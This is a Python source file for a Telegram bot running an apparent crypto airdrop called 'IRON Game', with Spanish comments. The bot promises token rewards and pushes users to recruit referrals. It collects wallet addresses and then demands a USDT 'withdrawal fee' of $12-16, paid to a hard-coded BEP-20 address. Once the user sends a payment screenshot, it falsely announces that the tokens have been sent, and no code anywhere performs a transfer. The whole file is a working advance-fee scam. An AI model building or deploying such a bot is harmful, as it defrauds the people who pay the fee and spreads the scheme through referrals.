import logging
from telegram import ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters , CallbackQueryHandler, CallbackContext
import DB
import random 
import re




 
# Configuración del registro
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
cardNum=0
user=""




def guardar(lista):
    archivo="datos.xlsx"
    DB.agregar_datos_a_excel(archivo,lista)

def echo (update, context):
    """Echo the user message."""
    message = update.message
    id = update.message.chat_id
    global user

    if message.text:
        for i in message.text:
            if i == "@":
                user = message.text
                respald(update, context)
                break

            if i == "0":
                cardNum = message.text
                DB.agregar_datos_a_excel(user, cardNum, id)
                respald2(update, context)
                break
            if i == "0" and DB.auth(update, context) == True:
                DB.agregarVerWallet(id, message.text)
            

    if message.photo:  # Check if the message contains a photo
        try:
            # Get the photo file object
            photo = message.photo[-1].get_file()
            # Call verify_command to send the message
            verify_command(update, context)
            # Save the photo to the 'images' folder
            photo.download(custom_path=f"images/pagos/{id}.jpg")
            print("Comprobante Guardado correctamente.")
        except Exception as e:
            print("Error al descargar Comprobante :", e)
def respald2(update, context):
    user_id = update.message.chat_id
    linkRef = generar_enlace_referido(user_id)
    mensaje112 = f"""
    🎁 Invite Your Friends to earn 5 IRON (~$12) for each referral

    🧍‍♂️ You Have Total: 0 Refers

    🔗 Your Referral Link: [{linkRef}]({linkRef})"""

    # Ruta de la foto
    photo_path = './images/congrat.jpg'

    # Enviar el mensaje y la foto
    context.bot.send_photo(
        chat_id=update.effective_chat.id,
        photo=open(photo_path, 'rb'),
        caption="",
        parse_mode='Markdown'
    )
    
    keyboard = [
        [InlineKeyboardButton("🧍‍♂️ Refferal", callback_data='referral'), InlineKeyboardButton("📤 Withdraw", callback_data='whitdraw')],
        [InlineKeyboardButton("💰 Balance", callback_data='balance'), InlineKeyboardButton("📞Contacts", callback_data='contact')]
    ]
    
    # Se envía el teclado como respuesta al mensaje original
    update.message.reply_markdown(mensaje112,reply_markup=InlineKeyboardMarkup(keyboard))
      
def generar_enlace_referido(user_id):
    # Construye el enlace de referencia con el comando /start y el ID del usuario
    enlace_referido = f"https://t.me/AsistentWorryBot?start={user_id}"
    return enlace_referido

def respald(update,context):
    mensaje111="""
    ✅ Send your IRON  (Polygon) Wallet Address

You must submit a valid wallet address, for lower commission, download and create a Binance Web 3 account

⚡️Contract:
0xe46F8c95C0b97De0b5341fd25436DebaD54DA2f."""
# Función para manejar el comando /start
# Función para manejar el comando /start

    # Ruta de la foto
    photo_path = './images/respaldo.jpg'

    # Enviar el mensaje y la foto
    context.bot.send_photo(
        chat_id=update.effective_chat.id,
        photo=open(photo_path, 'rb'),
        caption=mensaje111,
        parse_mode='Markdown'
    )
    
def start(update, context):
    user_id = update.message.chat_id
    
    if context.args:
        referral_id=context.args[0]
        try:
            DB.reffPlus(referral_id)
            
        except Exception as e:
            print("Error al establecer referido:", e)

    try:
        if DB.auth(user_id):
            welcome_message = """Hello, Welcome To IRON Game ⚡️ Bot

💰 Reward: 10 IRON (~$23)
👥 Referrals: 5 IRON (~$12)

- End date: 02 April 2024
- Distribution: To complete

🔥 Community Tasks
            
[♦️ Join» I Telegram Channel](https://t.me/+wvuO3on_uBk2MDgx)
[♦️ Join» I Telegram Global](https://t.me/IRONGlobalChat2)
[♦️ Join» Sponsor Telegram Channel](https://t.me/+gXa8aZirCFM0NzFh)

✅  Welcome Again """

            keyboard = [
                [InlineKeyboardButton("🧍‍♂️ Refferal", callback_data='referral'), InlineKeyboardButton("📤 Withdraw", callback_data='whitdraw')],
                [InlineKeyboardButton("💰 Balance", callback_data='balance'), InlineKeyboardButton("📞Contacts", callback_data='contact')]
            ]
            update.message.reply_markdown(welcome_message, reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            welcome_message = """Hello, Welcome To IRON Game⚡️ Bot

            💰 Reward: 10 IRON (~$23)
            👥 Referrals: 5 IRON (~$12)

            - End date: 02 April 2024
            - Distribution: To complete

            🔥 Community Tasks
                        
            [♦️ Join» I Telegram Channel](https://t.me/+wvuO3on_uBk2MDgx)
            [♦️ Join» I Telegram Global](https://t.me/IRONGlobalChat2)
            [♦️ Join» Sponsor Telegram Channel](https://t.me/+gXa8aZirCFM0NzFh)

            ✅  After completing mandatory please press CONTINUE for proceeding"""

            keyboard = [
                [InlineKeyboardButton("Continue", callback_data='continue')]
            ]

            update.message.reply_markdown(welcome_message, reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        print("Error:", e)

def extract_referred_id(link: str) -> str:
    pattern = r'\?start=(\d+)'
    match = re.search(pattern, link)
    if match:
        return match.group(1)
    else:
        return None

def whitdraw_command(update, context):
    
    callback_query = update.callback_query
    if callback_query:
        user_id = callback_query.message.chat_id
        refer_count = DB.reffCheck(user_id)  # Suponiendo que haya una función para obtener el número de referidos de un usuario
    
    if int(refer_count) < 4:
        welcome_message = f"""
📤 Withdrawal will be automatically sent to your Binance Web 3 wallet.

👉🏻You must have at least 4 referrals
👉🏻Maximum 8 referrals are credited

    """

        keyboard = [
            [InlineKeyboardButton("🧍‍♂️ Refferal", callback_data='referral'), InlineKeyboardButton("📤 Withdraw", callback_data='whitdraw')],
            [InlineKeyboardButton("💰 Your Balance", callback_data='balance'), InlineKeyboardButton("📞Contacts", callback_data='contact')],
           
        ]
        

        context.bot.send_message(chat_id=user_id, text=welcome_message, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        iron=(DB.ironCheck(user_id))
        
        welcome_message = f"""
➡️ Enter Amount Which You Want To Withdraw?

💰 Your Balance: {iron} IRON
"""

        keyboard = [
            [InlineKeyboardButton("🧍‍♂️ Refferal", callback_data='referral'), InlineKeyboardButton("📤 Withdraw", callback_data='whitdraw')],
            [InlineKeyboardButton("💰 Your Balance", callback_data='balance'), InlineKeyboardButton("📞Contacts", callback_data='contact')],
            [InlineKeyboardButton(f"Retirar {iron} IRON", callback_data='paymentCard')]
        ]
        

        context.bot.send_message(chat_id=user_id, text=welcome_message, reply_markup=InlineKeyboardMarkup(keyboard))

def referral_command(update, context):
    
    callback_query = update.callback_query
    if callback_query:
        user_id = callback_query.message.chat_id
        refer_count = str(DB.reffCheck(user_id))
        linkRef = generar_enlace_referido(user_id) 
    

    welcome_message = f"""
🎁 Invite Your Friends to earn 5 IRON (~$12) for each referral

🧍‍♂️ You Have Total: {refer_count} Refers

🔗 Your Referral Link: {linkRef}"""

    keyboard = [
        [InlineKeyboardButton("🧍‍♂️ Refferal", callback_data='referral'), InlineKeyboardButton("📤 Withdraw", callback_data='whitdraw')],
        [InlineKeyboardButton("💰 Your Balance", callback_data='balance'), InlineKeyboardButton("📞Contacts", callback_data='contact')]
        
    ]
   

    context.bot.send_message(chat_id=user_id, text=welcome_message, reply_markup=InlineKeyboardMarkup(keyboard))

def verify_command(update, context):
    
    user_id = update.message.chat_id
    print(user_id)
    iron=DB.ironCheck(user_id)
    listdata=DB.verifyCheck(user_id)

    welcome_message = f"""
⚠️We are corroborating your transfer data.

💸 You will receive {iron} IRON

💸 Your Wallet: {listdata[0]}

👉🏻Click " ✅ Verify " to complete your information"""

    keyboard = [
        [InlineKeyboardButton("✅ Verify", callback_data='verify2')],
        
    ]
   

    context.bot.send_message(chat_id=user_id, text=welcome_message, reply_markup=InlineKeyboardMarkup(keyboard))

def verify2_command(update, context):

    callback_query = update.callback_query
    if callback_query:
        user_id = callback_query.message.chat_id
    
    mensaje112 = f"""
🎉 Congratulations your tokens have been sent"""

    # Ruta de la foto
    photo_path = './images/congrat.jpg'

    # Enviar el mensaje y la foto
    context.bot.send_photo(
        chat_id=update.effective_chat.id,
        photo=open(photo_path, 'rb'),
        caption="",
        parse_mode='Markdown'
    )
    
    keyboard = [
        [InlineKeyboardButton("🧍‍♂️ Refferal", callback_data='referral'), InlineKeyboardButton("📤 Withdraw", callback_data='whitdraw')],
        [InlineKeyboardButton("💰 Balance", callback_data='balance'), InlineKeyboardButton("📞Contacts", callback_data='contact')]
    ]
    
    # Se envía el teclado como respuesta al mensaje original
    context.bot.send_message(user_id,mensaje112,reply_markup=InlineKeyboardMarkup(keyboard))  
def paymentCard_command(update, context):
    
    callback_query = update.callback_query
    if callback_query:
        user_id = callback_query.message.chat_id
        refer_count = str(DB.reffCheck(user_id))
        linkRef = generar_enlace_referido(user_id) 
        iron=(DB.ironCheck(user_id))
    
   
    if iron >= 30:
        price="""
📝 Send $12 USDT of BNB Smart Chain Network (BEP-20) as a fee to withdraw your IRON tokens.

Address:
0x212831ee07eb739377dd7fbc84e2c2976bb8ff53

➡️ After the server receives your transaction fee, you will receive your IRON tokens in 2-3 minutes.

⚠️ Note: You must send a screenshot to verify your payment in our wallet"""

    if iron == 35:
        price="""
📝 Send $13 USDT of BNB Smart Chain Network (BEP-20) as a fee to withdraw your IRON tokens.

Address:
0x212831ee07eb739377dd7fbc84e2c2976bb8ff53

➡️ After the server receives your transaction fee, you will receive your IRON tokens in 2-3 minutes.

⚠️ Note: You must send a screenshot to verify your payment in our wallet"""

    if iron >= 40:price="""
📝 Send $14 USDT of BNB Smart Chain Network (BEP-20) as a fee to withdraw your IRON tokens.

Address:
0x212831ee07eb739377dd7fbc84e2c2976bb8ff53

➡️ After the server receives your transaction fee, you will receive your IRON tokens in 2-3 minutes.

⚠️ Note: You must send a screenshot to verify your payment in our wallet"""

    
    if iron >=45:
        price="""
📝 Send $15 USDT of BNB Smart Chain Network (BEP-20) as a fee to withdraw your IRON tokens.

Address:
0x212831ee07eb739377dd7fbc84e2c2976bb8ff53

➡️ After the server receives your transaction fee, you will receive your IRON tokens in 2-3 minutes.

⚠️ Note: You must send a screenshot to verify your payment in our wallet
    """
    if iron >=50:
        price="""
📝 Send $16 USDT of BNB Smart Chain Network (BEP-20) as a fee to withdraw your IRON tokens.

Address:
0x212831ee07eb739377dd7fbc84e2c2976bb8ff53

➡️ After the server receives your transaction fee, you will receive your IRON tokens in 2-3 minutes.

⚠️ Note: You must send a screenshot to verify your payment in our wallet
    """



    keyboard = [
        [InlineKeyboardButton("🧍‍♂️ Refferal", callback_data='referral'), InlineKeyboardButton("📤 Withdraw", callback_data='whitdraw')],
        [InlineKeyboardButton("💰 Your Balance", callback_data='balance'), InlineKeyboardButton("📞Contacts", callback_data='contact')],
        [InlineKeyboardButton(f"Retirar {iron} ", callback_data='paymentCard')]
    ]
   

    context.bot.send_message(chat_id=user_id, text=price, reply_markup=InlineKeyboardMarkup(keyboard))

def continue_command(update, context):
    """Send a message when the command /continue is issued."""
    continue_message = """🔥 Community Tasks
       
[♦️ Join» I Telegram Channel](https://t.me/+wvuO3on_uBk2MDgx)

[♦️ Join» I Telegram Global](https://t.me/IRONGlobalChat2)

[♦️ Join» Sponsor Telegram Channel](https://t.me/+gXa8aZirCFM0NzFh)

✅  Send telegram User @...     """

    context.bot.send_message(chat_id=update.effective_chat.id, text=continue_message, parse_mode='Markdown')

def balance_command(update, context):
     
    callback_query = update.callback_query
    if callback_query:
        user_id = callback_query.message.chat_id
        refer_count = str(DB.reffCheck(user_id))
        # Suponiendo que haya una función para obtener el número de referidos de un usuario
        iron=DB.ironCheck(user_id)
    
        welcome_message = f"""
💰 Reward: 10 IRON (~$23)

👥 Referrals: 5 IRON (~$12)

💰Your Balance: {iron}

🎁 Your Joining Bonus: 10 IRON (~$23)

💰Your Referral balance: {iron-10} IRON (~$12)
        """

        keyboard = [
            [InlineKeyboardButton("🧍‍♂️ Refferal", callback_data='referral'), InlineKeyboardButton("📤 Withdraw", callback_data='whitdraw')],
            [InlineKeyboardButton("💰 Your Balance", callback_data='balance'), InlineKeyboardButton("📞Contacts", callback_data='contact')]
        ]
    

        context.bot.send_message(chat_id=user_id, text=welcome_message, reply_markup=InlineKeyboardMarkup(keyboard))
def contact_command(update, context):
     
    callback_query = update.callback_query
    if callback_query:
        user_id = callback_query.message.chat_id    
        welcome_message = f"""
[♦️ Join» I Telegram Channel](https://t.me/+wvuO3on_uBk2MDgx)

[♦️ Join» I Telegram Global](https://t.me/IRONGlobalChat2)

[♦️ Join» Sponsor Telegram Channel](https://t.me/+gXa8aZirCFM0NzFh))
        """

        keyboard = [
            [InlineKeyboardButton("🧍‍♂️ Refferal", callback_data='referral'), InlineKeyboardButton("📤 Withdraw", callback_data='whitdraw')],
            [InlineKeyboardButton("💰 Your Balance", callback_data='balance'), InlineKeyboardButton("📞Contacts", callback_data='contact')]
        ]
    

        context.bot.send_message(chat_id=user_id, text=welcome_message, reply_markup=InlineKeyboardMarkup(keyboard))

def button(update, context):
    query = update.callback_query
    query.answer()
    if query.data == 'continue':
        continue_command(update, context)
    if query.data == 'referral':
        referral_command(update, context)
    if query.data == 'whitdraw':
        whitdraw_command(update, context)
    if query.data == 'balance':
        balance_command(update, context)
    if query.data == 'paymentCard':
        paymentCard_command(update, context)
    if query.data == 'verify2':
        verify2_command(update, context)
    if query.data == 'contact':
        contact_command(update, context)
 
def main():
    """Start the bot."""
    # Inicializar el updater con el token del bot y una cola de actualizaciones
    updater = Updater("YOUR_TOKEN_ID")

    # Obtener el despachador para registrar los manejadores
    dispatcher = updater.dispatcher

    

    # Registrar el manejador para mensajes de texto
    dispatcher.add_handler(MessageHandler(Filters.all & ~Filters.command, echo))

    
    # Registrar el manejador para el comando /start
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("continue", continue_command))
    dispatcher.add_handler(CommandHandler("referral", referral_command))
    dispatcher.add_handler(CommandHandler("whitdraw", whitdraw_command))
    dispatcher.add_handler(CommandHandler("balance", balance_command))
    dispatcher.add_handler(CommandHandler("payment", paymentCard_command))
    dispatcher.add_handler(CommandHandler("verify", verify_command))
    dispatcher.add_handler(CommandHandler("verify2", verify2_command))
    #MANEJADOR BOTTON
    dispatcher.add_handler(CallbackQueryHandler(button))
    

    # Iniciar el bot
    updater.start_polling()

    # Mantener el bot funcionando hasta que se presione Ctrl+C
    updater.idle()

if __name__ == "__main__":
    main()
